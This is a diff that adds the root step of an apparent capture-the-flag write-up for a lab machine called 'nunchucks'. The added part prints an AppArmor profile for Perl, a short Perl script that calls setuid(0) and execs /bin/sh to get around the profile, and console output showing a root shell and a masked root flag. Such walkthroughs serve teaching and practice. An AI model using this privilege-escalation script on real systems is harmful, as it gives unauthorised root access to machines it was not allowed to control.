@@ -190,3 +190,54 @@ david@nunchucks:~$ cat user.txt
 cat user.txt
 3c82****************************
 ```
+
+```console
+david@nunchucks:/tmp$ cat /etc/apparmor.d/usr.bin.perl
+cat /etc/apparmor.d/usr.bin.perl
+# Last Modified: Tue Aug 31 18:25:30 2021
+#include <tunables/global>
+
+/usr/bin/perl {
+  #include <abstractions/base>
+  #include <abstractions/nameservice>
+  #include <abstractions/perl>
+
+  capability setuid,
+
+  deny owner /etc/nsswitch.conf r,
+  deny /root/* rwx,
+  deny /etc/shadow rwx,
+
+  /usr/bin/id mrix,
+  /usr/bin/ls mrix,
+  /usr/bin/cat mrix,
+  /usr/bin/whoami mrix,
+  /opt/backup.pl mrix,
+  owner /home/ r,
+  owner /home/david/ r,
+
+}
+```
+
+http://0xma.com/hacking/bypass_apparmor_with_perl_script.html
+
+```perl
+#!/usr/bin/perl
+use POSIX qw(strftime);
+use POSIX qw(setuid);
+POSIX::setuid(0);
+
+exec "/bin/sh"
+```
+
+```console
+david@nunchucks:/tmp$ ./rogue.pl
+./rogue.pl
+# id
+id
+uid=0(root) gid=1000(david) groups=1000(david)
+# cat /root/root.txt
+cat /root/root.txt
+5a9*****************************
+# 
+```
